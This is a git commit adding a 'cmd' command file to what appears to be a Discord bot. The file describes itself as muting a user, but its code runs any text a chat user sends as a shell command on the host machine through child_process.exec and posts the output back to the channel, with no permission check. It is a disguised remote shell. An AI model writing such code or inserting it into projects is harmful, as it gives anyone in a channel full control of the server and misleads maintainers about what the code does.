68eff63d0ff524ab49b258f30793c93a457f625a
minnu <35523357+yahu1031@users.noreply.github.com>
2021-07-02 13:10:40 +0530

    Create cmd.js

---
+++ commands/cmd.js
@@ -0,0 +1,20 @@
+const process = require('child_process');
+
+module.exports = {
+    name: 'cmd',
+    description: 'This command will mute the user.',
+    args: true,
+    execute(client, message, args) {
+        if (message.author.bot) return;
+        process.exec(args.join(' '), async (error, stdout) => {
+            const response = (error || stdout);
+            await message.channel.send('please wait...').then(async m => {
+                await m.delete({ timeout: 10000 });
+                await message.channel.send(response,
+                    { code: 'asciidoc', split: '\n' })
+                    .catch(err => message.channel.send(`💔 Error: ${err.message}`));
+            });
+        });
+        return;
+    },
+};
